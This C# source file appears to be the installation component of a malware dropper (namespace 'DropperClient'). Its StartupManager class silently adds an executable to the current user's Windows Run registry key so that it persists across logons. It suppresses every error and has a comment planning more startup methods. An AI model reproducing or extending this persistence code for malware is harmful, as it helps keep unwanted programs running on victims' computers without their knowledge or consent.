using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace DropperClient.Installation
{
    internal class StartupManager
    {
        /// <summary>
        /// Attempts to add the executable to startup
        /// </summary>
        /// <param name="executableName">Executable's name </param>
        /// <param name="executablePath">Executable's full filepath</param>
        public void AddToStartup(string executableName, string executablePath)
        {
            // Should implement more ways to add to startup

            try
            {
                SetRegistryStartup(executableName, executablePath);
            }
            catch
            {
                // Supress
            }
        }

        /// <summary>
        /// Adds a registry key with the executable name as keyname and path as value
        /// Should take care of startup
        /// </summary>
        /// <param name="executableName"></param>
        /// <param name="executablePath"></param>
        private void SetRegistryStartup(string executableName, string executablePath)
        {
            var rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            rk.SetValue(executableName, executablePath);
        }
    }
}